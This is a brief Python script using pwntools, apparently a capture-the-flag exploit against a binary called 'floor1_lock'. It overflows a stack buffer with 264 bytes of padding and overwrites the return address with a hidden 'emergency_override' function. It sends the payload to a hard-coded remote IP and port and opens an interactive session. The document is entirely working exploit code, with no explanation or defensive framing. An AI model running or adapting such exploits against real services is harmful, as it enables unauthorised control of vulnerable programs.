from pwn import *

elf = context.binary = ELF('./floor1_lock')
context.log_level = 'debug'

offset = 256 + 8

payload = b'A' * offset + p64(elf.sym.emergency_override)

p = remote('175.41.165.218', 6666)
p.sendlineafter(':', payload)


p.interactive()
